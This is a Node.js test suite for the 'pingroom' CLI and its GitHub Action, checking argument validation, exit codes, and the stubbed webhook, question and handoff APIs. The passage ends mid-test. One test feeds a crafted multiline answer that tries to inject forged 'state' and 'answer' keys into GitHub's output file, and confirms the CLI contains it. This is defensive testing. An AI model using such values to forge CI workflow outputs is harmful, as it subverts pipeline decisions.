import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CLI = join(__dirname, '..', 'bin', 'pingroom.js');

test('GitHub Action forwards acknowledgement inputs to the CLI', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  assert.match(action, /^  require-ack:/m);
  assert.match(action, /^  ack-timeout:/m);
  assert.match(action, /args\+=\(--require-ack\)/);
  assert.match(action, /args\+=\(--ack-timeout "\$PR_ACK_TIMEOUT"\)/);
});

test('GitHub Action exposes handoff inputs and outputs', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  // Handoff inputs
  assert.match(action, /^  handoff:/m);
  assert.match(action, /^  question:/m);
  assert.match(action, /^  options:/m);
  assert.match(action, /^  idempotency-key:/m);
  assert.match(action, /^  target:/m);
  assert.match(action, /^  expires-in:/m);
  assert.match(action, /^  wait:/m);
  // Outputs
  assert.match(action, /^outputs:/m);
  assert.match(action, /^  handoff-id:/m);
  assert.match(action, /^  state:/m);
  assert.match(action, /^  acknowledged-by:/m);
  assert.match(action, /^  answer:/m);
  assert.match(action, /^  delivery-state:/m);
  // The CLI owns GitHub's output-file protocol; the shell never interprets
  // untrusted answer stdout as output commands.
  assert.match(action, /args=\(handoff -m "\$PR_MESSAGE"\)/);
  assert.match(action, /Idempotency-Key/i);
  assert.match(action, /--github-output "\$GITHUB_OUTPUT"/);
  assert.doesNotMatch(action, /while IFS=['"]?=['"]? read/);
  assert.doesNotMatch(action, />>\s*"\$GITHUB_OUTPUT"/);
  assert.match(action, /exit \$code/);
  assert.match(action, /@pingroom\/cli@0\.6\.0/);
});

test('package version matches the GitHub Action CLI pin', () => {
  const pkg = JSON.parse(readFileSync(join(__dirname, '..', 'package.json'), 'utf8'));
  const lock = JSON.parse(readFileSync(join(__dirname, '..', 'package-lock.json'), 'utf8'));
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  assert.equal(pkg.version, '0.6.0');
  assert.equal(lock.version, pkg.version);
  assert.equal(lock.packages[''].version, pkg.version);
  assert.match(action, new RegExp(`@pingroom/cli@${pkg.version.replaceAll('.', '\\.')}`));
});

/**
 * Run the CLI as a real subprocess and capture its exit code + streams.
 * Pass `env` overrides for credential/endpoint config. PINGROOM_* env vars
 * are stripped by default so the host machine's config can't leak in.
 */
// A throwaway PINGROOM_HOME shared by every run that doesn't ask for its own,
// so the developer's real ~/.pingroom (paired credential, default_room) can
// never change what a test sees.
const EMPTY_HOME = mkdtempSync(join(tmpdir(), 'pingroom-empty-'));

/** Strip every PINGROOM_* input and pin the local state at an empty directory. */
function baseEnv() {
  const cleanEnv = { ...process.env };
  delete cleanEnv.PINGROOM_WEBHOOK_URL;
  delete cleanEnv.PINGROOM_TOKEN;
  delete cleanEnv.PINGROOM_API_URL;
  delete cleanEnv.PINGROOM_ROOM;
  delete cleanEnv.PINGROOM_FORCE_TTY;
  cleanEnv.PINGROOM_HOME = EMPTY_HOME;
  return cleanEnv;
}

function run(args, env = {}) {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    env: { ...baseEnv(), ...env },
    encoding: 'utf8',
  });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

/**
 * Async variant for tests that need an in-process stub server: spawnSync would
 * block the event loop and deadlock against a localhost server running in the
 * same process, so use async spawn and resolve on close.
 *
 * `stdin` feeds the interactive prompts (the connect picker, email, OTP); it is
 * written as one blob and the pipe is closed, which is enough because every
 * prompt is answered in order.
 */
function runAsync(args, env = {}, { stdin } = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [CLI, ...args], {
      env: { ...baseEnv(), ...env },
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (c) => (stdout += c));
    child.stderr.on('data', (c) => (stderr += c));
    child.on('error', reject);
    child.on('close', (status) => resolve({ status, stdout, stderr }));
    if (stdin !== undefined) child.stdin.write(stdin);
    child.stdin.end();
  });
}

/** Start a one-shot localhost stub server. Resolves once it's listening. */
function startServer(handler) {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({ server, baseUrl: `http://127.0.0.1:${port}` });
    });
  });
}

// ---------------------------------------------------------------------------
// Exit 0 — help / no-command
// ---------------------------------------------------------------------------

test('exit 0: no command prints help', () => {
  const { status, stdout } = run([]);
  assert.equal(status, 0);
  assert.match(stdout, /pingroom — send a ping/);
});

test('exit 0: --help prints help', () => {
  const { status, stdout } = run(['--help']);
  assert.equal(status, 0);
  assert.match(stdout, /Exit codes: 0 on success/);
});

test('exit 0: -h prints help', () => {
  const { status } = run(['-h']);
  assert.equal(status, 0);
});

test('exit 0: "help" command prints help', () => {
  const { status, stdout } = run(['help']);
  assert.equal(status, 0);
  assert.match(stdout, /Usage:/);
});

test('exit 0: ping -h prints help via the ping path', () => {
  // `ping -h` routes through parseArgs -> args.help -> ping() returns 0.
  const { status, stdout } = run(['ping', '-h']);
  assert.equal(status, 0);
  assert.match(stdout, /pingroom — send a ping/);
});

// ---------------------------------------------------------------------------
// Exit 2 — bad usage
// ---------------------------------------------------------------------------

test('exit 2: unknown command', () => {
  const { status, stderr } = run(['frobnicate']);
  assert.equal(status, 2);
  assert.match(stderr, /unknown command: frobnicate/);
});

test('exit 2: unknown option', () => {
  const { status, stderr } = run(['ping', '--bogus', 'x']);
  assert.equal(status, 2);
  assert.match(stderr, /Unknown option: --bogus/);
});

test('exit 2: missing --message', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook']);
  assert.equal(status, 2);
  assert.match(stderr, /--message is required/);
});

test('exit 2: bad --action (out of range)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-a', '7']);
  assert.equal(status, 2);
  assert.match(stderr, /--action must be an integer/);
});

test('exit 2: bad --action (non-numeric)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-a', 'foo']);
  assert.equal(status, 2);
  assert.match(stderr, /--action must be an integer/);
});

test('exit 2: invalid --data JSON', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-d', '{not json}']);
  assert.equal(status, 2);
  assert.match(stderr, /--data must be valid JSON/);
});

test('exit 2: --data is valid JSON but not an object', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-d', '[1,2,3]']);
  assert.equal(status, 2);
  assert.match(stderr, /--data must be a JSON object/);
});

test('exit 2: --ack-timeout requires --require-ack', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--ack-timeout', '120']);
  assert.equal(status, 2);
  assert.match(stderr, /--ack-timeout requires --require-ack/);
});

test('exit 2: --ack-timeout needs a value', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--require-ack', '--ack-timeout',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /option --ack-timeout needs a value/);
});

test('exit 2: webhook --ack-timeout must be within 1–86400 seconds', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--require-ack', '--ack-timeout', '0',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /between 1 and 86400/);
});

test('exit 2: agent room --ack-timeout must be within 60–86400 seconds', () => {
  const { status, stderr } = run([
    'ping', '--token', 'tok', '--room', 'ab12cd', '--api', 'http://127.0.0.1:1',
    '-m', 'hi', '--require-ack', '--ack-timeout', '30',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /between 60 and 86400/);
});

test('exit 2: --button-label requires --url', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--button-label', 'Open']);
  assert.equal(status, 2);
  assert.match(stderr, /--button-label requires --url/);
});

test('exit 2: --url must be a valid absolute URL', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--url', '/relative/path']);
  assert.equal(status, 2);
  assert.match(stderr, /--url is not a valid URL/);
});

test('exit 2: --url must be http(s)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--url', 'ftp://example.com/x']);
  assert.equal(status, 2);
  assert.match(stderr, /--url must be an absolute http\(s\) URL/);
});

test('exit 2: --button-label over 26 chars', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi',
    '--url', 'https://example.com', '--button-label', 'x'.repeat(27),
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--button-label must be at most 26 characters/);
});

test('exit 2: --token without --room', () => {
  const { status, stderr } = run(['ping', '--token', 'tok_abc', '-m', 'hi']);
  assert.equal(status, 2);
  assert.match(stderr, /--room is required/);
});

test('exit 2: no credential (no webhook, no token)', () => {
  const { status, stderr } = run(['ping', '-m', 'hi']);
  assert.equal(status, 2);
  assert.match(stderr, /provide a webhook .* or an agent token/);
});

// ---------------------------------------------------------------------------
// Exit 0 — successful delivery (stubbed server)
// ---------------------------------------------------------------------------

test('exit 0: successful webhook delivery', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ method: req.method, url: req.url, body });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'ping', '-w', `${baseUrl}/hook`, '-m', 'hello', '--require-ack', '--ack-timeout', '45',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received.length, 1);
    assert.equal(received[0].method, 'POST');
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'hello', requires_ack: true, ack_timeout_seconds: 45,
    });
  } finally {
    server.close();
  }
});

test('exit 0: link ping folds --url/--button-label into data', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ body });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
  });
  try {
    const { status } = await runAsync([
      'ping', '-w', `${baseUrl}/hook`, '-m', 'build ready',
      '-d', '{"commit":"abc123"}',
      '--url', 'https://ci.example.com/b/512', '--button-label', 'Open build',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'build ready',
      data: { commit: 'abc123', url: 'https://ci.example.com/b/512', button_label: 'Open build' },
    });
  } finally {
    server.close();
  }
});

test('exit 0: successful agent-token delivery via --api override', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ url: req.url, auth: req.headers['authorization'], body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ id: 'n1' }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'ping', '--token', 'tok_abc', '--room', 'ab12cd', '--api', baseUrl,
      '-m', 'shipped', '-t', 'CI', '-a', '2', '-d', '{"version":"1.4.0"}',
      '--require-ack', '--ack-timeout', '300',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received[0].url, '/api/agent/rooms/ab12cd/notifications');
    assert.equal(received[0].auth, 'Bearer tok_abc');
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'shipped', title: 'CI', action_number: 2, data: { version: '1.4.0' },
      requires_ack: true, ack_timeout_seconds: 300,
    });
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// Exit 1 — delivery failure
// ---------------------------------------------------------------------------

test('exit 1: HTTP error response from server', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ message: 'boom' }));
  });
  try {
    const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, '-m', 'hi']);
    assert.equal(status, 1);
    assert.match(stderr, /delivery failed: boom/);
  } finally {
    server.close();
  }
});

test('exit 1: 200 OK but success:false in body', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: false, error: 'rejected' }));
  });
  try {
    const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, '-m', 'hi']);
    assert.equal(status, 1);
    assert.match(stderr, /delivery failed: rejected/);
  } finally {
    server.close();
  }
});

test('exit 1: network error (connection refused)', () => {
  // Port 1 is privileged/unused -> fetch throws -> fail() defaults to code 1.
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi']);
  assert.equal(status, 1);
  assert.match(stderr, /network error/);
});

// ---------------------------------------------------------------------------
// Questions — ask / watch / list / cancel
// ---------------------------------------------------------------------------

/** Route a stub server by "METHOD /pathname". Each handler returns { status, body }. */
function questionServer(routes) {
  const received = [];
  return startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const path = req.url.split('?')[0];
      received.push({ method: req.method, path, query: req.url.split('?')[1] ?? '', auth: req.headers['authorization'], body });
      const handler = routes[`${req.method} ${path}`];
      const out = handler ? handler(body) : { status: 404, body: { message: 'no route' } };
      res.writeHead(out.status ?? 200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(out.body ?? {}));
    });
  }).then((s) => ({ ...s, received }));
}

test('exit 2: ask without --prompt', () => {
  const { status, stderr } = run(['ask', '--token', 't', '--room', 'ab12cd']);
  assert.equal(status, 2);
  assert.match(stderr, /--prompt is required/);
});

test('exit 2: ask without a token', () => {
  const { status, stderr } = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?']);
  assert.equal(status, 2);
  assert.match(stderr, /agent token is required/);
});

test('exit 2: ask without --room', () => {
  const { status, stderr } = run(['ask', '--token', 't', '-p', 'Deploy?']);
  assert.equal(status, 2);
  assert.match(stderr, /--room is required/);
});

test('exit 2: watch without an id', () => {
  const { status, stderr } = run(['watch', '--token', 't']);
  assert.equal(status, 2);
  assert.match(stderr, /question id is required/);
});

test('exit 2: bad --scope', () => {
  const { status, stderr } = run(['ask', '--token', 't', '--room', 'ab12cd', '-p', 'x', '--scope', 'sideways']);
  assert.equal(status, 2);
  assert.match(stderr, /--scope must be/);
});

test('exit 2: bad --text-max', () => {
  const { status, stderr } = run([
    'ask', '--token', 't', '--room', 'ab12cd', '-p', 'x',
    '--text-input', 'Why?', '--text-max', 'lots',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--text-max must be an integer/);
});

test('exit 2: --text-max out of range', () => {
  const { status, stderr } = run([
    'ask', '--token', 't', '--room', 'ab12cd', '-p', 'x', '--text-max', '61',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--text-max must be an integer/);
});

test('ask (no --wait) creates the question and prints its id', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_1', state: 'pending' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-p', 'Which env?', '-o', 'prod:Production', '-o', 'staging:Staging', '--scope', 'room',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'q_1');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      prompt: 'Which env?',
      options: [{ value: 'prod', label: 'Production' }, { value: 'staging', label: 'Staging' }],
      responder_scope: 'room',
    });
  } finally {
    server.close();
  }
});

test('ask serializes option styles, text_input, and reply_to', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_s', state: 'pending' } }),
  });
  try {
    const { status } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-p', 'Roll back?',
      '-o', 'yes:Roll back:danger', '-o', 'no:Keep it',
      '--text-input', 'Why?', '--text-max', '40',
      '--reply-to', 'ping_9',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(JSON.parse(received[0].body), {
      prompt: 'Roll back?',
      options: [
        { value: 'yes', label: 'Roll back', style: 'danger' },
        { value: 'no', label: 'Keep it' },
      ],
      reply_to: 'ping_9',
      text_input: { placeholder: 'Why?', max_length: 40 },
    });
  } finally {
    server.close();
  }
});

test('ask --wait blocks and prints the chosen value with exit 0', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_2', state: 'pending' } }),
    'GET /api/agent/questions/q_2/wait': () => ({ status: 200, body: { id: 'q_2', state: 'answered', answer: { value: 'approve', label: 'Approve' } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl, '--wait', '-p', 'Deploy?',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'approve');
  } finally {
    server.close();
  }
});

test('ask --wait --json prints the terminal response as JSON', async () => {
  const terminal = { id: 'q_json', state: 'answered', answer: { value: 'approve', label: 'Approve' } };
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_json', state: 'pending' } }),
    'GET /api/agent/questions/q_json/wait': () => ({ status: 200, body: terminal }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '--wait', '--json', '-p', 'Deploy?',
    ]);
    assert.equal(status, 0, stderr);
    assert.deepEqual(JSON.parse(stdout), terminal);
  } finally {
    server.close();
  }
});

test('ask --wait exits 3 on expiry', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_3', state: 'pending' } }),
    'GET /api/agent/questions/q_3/wait': () => ({ status: 200, body: { id: 'q_3', state: 'expired', answer: null } }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl, '--wait', '-p', 'Deploy?',
    ]);
    assert.equal(status, 3);
    assert.equal(stdout.trim(), '');
    assert.match(stderr, /question expired/);
  } finally {
    server.close();
  }
});

test('list prints a row per question', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/questions': () => ({ status: 200, body: { questions: [
      { id: 'q_1', state: 'answered', prompt: 'Deploy?', answer: { value: 'approve' } },
      { id: 'q_2', state: 'pending', prompt: 'Merge?', answer: null },
    ] } }),
  });
  try {
    const { status, stdout } = await runAsync(['list', '--token', 'tok', '--api', baseUrl, '--state', 'all']);
    assert.equal(status, 0);
    assert.match(stdout, /q_1\s+answered\s+Deploy\? → approve/);
    assert.match(stdout, /q_2\s+pending\s+Merge\?/);
    assert.match(received[0].query, /state=all/);
  } finally {
    server.close();
  }
});

test('cancel withdraws a pending question', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/questions/q_9/cancel': () => ({ status: 200, body: { id: 'q_9', state: 'cancelled' } }),
  });
  try {
    const { status, stdout } = await runAsync(['cancel', '--token', 'tok', '--api', baseUrl, 'q_9']);
    assert.equal(status, 0);
    assert.match(stdout, /cancelled \(cancelled\)/);
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// handoff
// ---------------------------------------------------------------------------

function parseGitHubOutputFile(raw) {
  const lines = raw.split('\n');
  const outputs = {};
  for (let i = 0; i < lines.length;) {
    if (lines[i] === '') {
      i += 1;
      continue;
    }
    const header = /^([A-Za-z0-9_-]+)<<(.+)$/.exec(lines[i]);
    assert.ok(header, `invalid GitHub output header: ${lines[i]}`);
    const [, name, delimiter] = header;
    i += 1;
    const valueLines = [];
    while (i < lines.length && lines[i] !== delimiter) {
      valueLines.push(lines[i]);
      i += 1;
    }
    assert.equal(lines[i], delimiter, `missing delimiter for ${name}`);
    i += 1;
    outputs[name] = valueLines.join('\n');
  }
  return outputs;
}

test('github output protocol contains malicious multiline answers without output injection', async () => {
  const maliciousAnswer = 'ok\nstate=acked\r\nanswer=owned\npingroom_0123456789abcdef\nEOF_like';
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({
      status: 201,
      body: { id: 'h_malicious', kind: 'question', state: 'pending' },
    }),
    'GET /api/agent/handoffs/h_malicious/wait': () => ({
      status: 200,
      body: {
        id: 'h_malicious',
        kind: 'question',
        state: 'answered',
        answer: { value: maliciousAnswer, label: 'Untrusted' },
      },
    }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-output-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '--github-output', outputPath, '-m', 'Ship?', '--question', '-o', 'ok:OK', '-o', 'hold:Hold',
    ]);
    assert.equal(status, 0, stderr);

    // Preserve the normal key=value stdout contract for non-Action callers.
    assert.match(stdout, /answer=ok\nstate=acked\r\nanswer=owned/);

    const raw = readFileSync(outputPath, 'utf8');
    assert.match(raw, /^handoff-id<<pingroom_[0-9a-f]{48}$/m);
    const outputs = parseGitHubOutputFile(raw);
    assert.deepEqual(Object.keys(outputs).sort(), ['answer', 'handoff-id', 'state']);
    assert.equal(outputs['handoff-id'], 'h_malicious');
    assert.equal(outputs.state, 'answered');
    assert.equal(outputs.answer, maliciousAnswer);
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handoffs lists recent history with state=all without changing question list', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/handoffs': () => ({ status: 200, body: { handoffs: [
      { id: 'h_done', kind: 'question', state: 'answered', prompt: 'Ship?', answer: { value: 'hold' } },
      { id: 'h_open', kind: 'ack', state: 'open', prompt: 'Review this' },
    ] } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoffs', '--token', 'tok', '--api', baseUrl, '--state', 'all',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /h_done\s+question\s+answered\s+Ship\? → hold/);
    assert.match(stdout, /h_open\s+ack\s+open\s+Review this/);
    assert.equal(received[0].path, '/api/agent/handoffs');
    assert.match(received[0].query, /(?:^|&)state=all(?:&|$)/);
  } finally {
    server.close();
  }
});

test('handoffs defaults to open and rejects question-only states', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/handoffs': () => ({ status: 200, body: { handoffs: [] } }),
  });
  try {
    const open = await runAsync(['handoffs', '--token', 'tok', '--api', baseUrl]);
    assert.equal(open.status, 0);
    assert.equal(open.stdout.trim(), 'no handoffs');
    assert.match(received[0].query, /(?:^|&)state=open(?:&|$)/);
  } finally {
    server.close();
  }

  const invalid = run(['handoffs', '--token', 'tok', '--state', 'answered']);
  assert.equal(invalid.status, 2);
  assert.match(invalid.stderr, /--state must be 'open' or 'all'/);
});

test('exit 2: handoff without --message', () => {
  const { status, stderr } = run(['handoff', '--token', 't']);
  assert.equal(status, 2);
  assert.match(stderr, /--message is required/);
});

test('exit 2: handoff without a token', () => {
  const { status, stderr } = run(['handoff', '-m', 'Ack?']);
  assert.equal(status, 2);
  assert.match(stderr, /agent token is required/);
});

test('exit 2: handoff --question needs at least 2 options', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--question', '-o', 'only:One']);
  assert.equal(status, 2);
  assert.match(stderr, /at least 2 --option/);
});

test('exit 2: handoff --option without --question is still a question (needs 2)', () => {
  // A single --option implies a question but falls short of the 2-option floor.
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '-o', 'solo']);
  assert.equal(status, 2);
  assert.match(stderr, /at least 2 --option/);
});

test('exit 2: handoff rejects more than 4 options', () => {
  const { status, stderr } = run([
    'handoff', '--token', 't', '-m', 'x', '--question',
    '-o', 'one', '-o', 'two', '-o', 'three', '-o', 'four', '-o', 'five',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /at most 4 --option/);
});

test('exit 2: handoff bad --urgency', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--urgency', 'loud']);
  assert.equal(status, 2);
  assert.match(stderr, /--urgency must be/);
});

test('exit 2: handoff --expires-in out of range', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--expires-in', '5']);
  assert.equal(status, 2);
  assert.match(stderr, /between 120 and 86400/);
});

test('handoff ack (no --wait) posts kind=ack and prints machine-readable output', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_1', state: 'open', delivery_state: 'enqueued' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack to proceed',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^id=h_1$/m);
    assert.match(stdout, /^state=open$/m);
    assert.match(stdout, /^delivery-state=enqueued$/m);
    assert.equal(received[0].method, 'POST');
    assert.equal(received[0].path, '/api/agent/handoffs');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      kind: 'ack', prompt: 'Ack to proceed', audience: { type: 'direct', user_id: 'me' },
    });
  } finally {
    server.close();
  }
});

test('handoff sends the Idempotency-Key header and full question body', async () => {
  let idemHeader;
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_2', state: 'pending', delivery_state: 'pending' } }),
  });
  // questionServer doesn't capture arbitrary headers, so wrap to grab it.
  server.removeAllListeners('request');
  server.on('request', (req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      idemHeader = req.headers['idempotency-key'];
      received.push({ method: req.method, path: req.url.split('?')[0], auth: req.headers['authorization'], body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ id: 'h_2', state: 'pending', delivery_state: 'pending' }));
    });
  });
  try {
    const { status } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ship 1.4.0?',
      '--question', '-o', 'deploy:Deploy', '-o', 'hold:Hold',
      '--target', 'u-123', '--expires-in', '600', '--urgency', 'passive',
      '--idempotency-key', 'key-abc', '--correlation-id', 'corr-9', '--reply-to', 'r-1',
      '-d', '{"pr":42}',
    ]);
    assert.equal(status, 0);
    assert.equal(idemHeader, 'key-abc');
    assert.deepEqual(JSON.parse(received[0].body), {
      kind: 'question', prompt: 'Ship 1.4.0?',
      audience: { type: 'direct', user_id: 'u-123' },
      options: [{ value: 'deploy', label: 'Deploy' }, { value: 'hold', label: 'Hold' }],
      expires_in: 600, urgency: 'passive',
      correlation_id: 'corr-9', reply_to: 'r-1', data: { pr: 42 },
    });
  } finally {
    server.close();
  }
});

test('handoff --wait exits 0 on acked and prints acked-by', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_3', state: 'open', delivery_state: 'enqueued' } }),
    'GET /api/agent/handoffs/h_3/wait': () => ({ status: 200, body: { id: 'h_3', state: 'acked', delivery_state: null, acked_by: { id: 'u-7', display_name: 'Maya' }, acked_at: '2026-07-12T00:00:00Z' } }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-delivery-state-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '--github-output', outputPath, '-m', 'Ack?',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^state=acked$/m);
    assert.match(stdout, /^delivery-state=enqueued$/m);
    assert.match(stdout, /^acked-by=u-7$/m);
    const outputs = parseGitHubOutputFile(readFileSync(outputPath, 'utf8'));
    assert.equal(outputs['delivery-state'], 'enqueued');
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handoff --wait --json preserves the raw terminal response', async () => {
  const terminal = { id: 'h_json', state: 'acked', delivery_state: null, acked_by: { id: 'u-8' } };
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({
      status: 201,
      body: { id: 'h_json', state: 'open', delivery_state: 'enqueued' },
    }),
    'GET /api/agent/handoffs/h_json/wait': () => ({ status: 200, body: terminal }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '--json', '-m', 'Ack?',
    ]);
    assert.equal(status, 0, stderr);
    assert.deepEqual(JSON.parse(stdout), terminal);
  } finally {
    server.close();
  }
});

test('handoff prints an empty acked-by when the server redacts the actor id', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_redacted', state: 'open' } }),
    'GET /api/agent/handoffs/h_redacted/wait': () => ({ status: 200, body: { id: 'h_redacted', state: 'acked', acked_by: { id: null, display_name: null } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '-m', 'Ack?',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^acked-by=$/m);
    assert.doesNotMatch(stdout, /\[object Object\]/);
  } finally {
    server.close();
  }
});

test('handoff --wait exits 0 on a NEGATIVE answer (hold is not a failure)', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_4', state: 'pending' } }),
